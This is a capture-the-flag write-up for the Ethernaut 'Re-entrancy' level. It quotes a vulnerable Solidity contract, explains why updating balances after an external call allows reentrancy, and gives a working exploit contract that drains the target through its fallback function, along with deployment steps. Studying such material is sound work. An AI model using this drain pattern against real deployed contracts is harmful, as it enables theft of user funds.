# Re-entrancy

>The goal of this level is for you to steal all the funds from the contract.

> Things that might help:
>
> * Untrusted contracts can execute code where you least expect it.
> * Fallback methods
> * Throw/revert bubbling
> * Sometimes the best way to attack a contract is with another contract.
> * See the "?" page above, section "Beyond the console"

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
Re-entrancy attacks are one of the most common attacks implemented by hackers. To understand it better, we must look at it in deep.

Re-entrancy attack allows untrusted malicious code to be executed repetitively inside the vulnerable contract. 
This happens when the vulnerable contract calls the malicious contract and the malious contract in turn calls the vulnerable contract again thus creating somewhat an infinite loop.

To goal of this level is to steal all the funds of the given contract.

On a quick analysis of the given contract, we can find the function of our interest i.e., the function vulnerable to reentrancy which is the `withdraw` function.

Inside the withdraw function, if the balance of the `msg.sender` is more than the amount then the contract sends ether to `msg.sender` by the call function.
Since the balance of `msg.sender` is only being updated after the transaction is made, this introduces a vulnerability in this function.

The basic scenario in a reentrancy attack can be represented by the following picture
![reentrancy](https://github.com/blueh4mster/Ethernaut-writeups/assets/102573660/19ebff63-facd-4c15-810a-7b9ec0d7c6bf)

The exploit contract for this level can be framed as follows

```solidity
contract exploit{
    Reentrance r;
    constructor(Reentrance addr) public {
        r = Reentrance(addr);
    }

    fallback() external payable {
        if (address(r).balance >= 0.001 ether) {
            r.withdraw(0.001 ether);
        }
    }

    function hack() public {
        r.donate{value : 0.001 ether}(address(this));
        r.withdraw(0.001 ether);
    }

    function withdrawAll() public {
        msg.sender.transfer(address(this).balance);
    }
}
```

We are well aware that `fallback` function is the function which is triggered when the contract receives some ether and has no `receive` function.

When the contract sends ether to the `msg.sender` (considered to be another exploit contract in this scenario), the exploit contract's `fallback` function is triggered in which we make sure that if the amount is greater than 0.001 ether, we call the withdraw function again causing the balance of `msg.sender` to be updated only when the loop breaks i.e., when all the funds have been transferred to the exploit contract.

Now, we deploy the above contract with 0.001 ether as funds, and then we call the `hack` function and then the `withdrawAll` function (optional). We can confirm that the balance of the `Reentrance` contract is now reduced to 0 through the browser's console.

(The above contract may be deployed in remix using Injected Web3.0 Provider MetaMask.)

Image source : [Reentrancy Attack](https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.geeksforgeeks.org%2Freentrancy-attack-in-smart-contracts%2F&psig=AOvVaw3a6TVpUEB80BE6EDq-PSRg&ust=1697094678092000&source=images&cd=vfe&opi=89978449&ved=0CBMQjhxqFwoTCOjCntzu7IEDFQAAAAAdAAAAABAE)
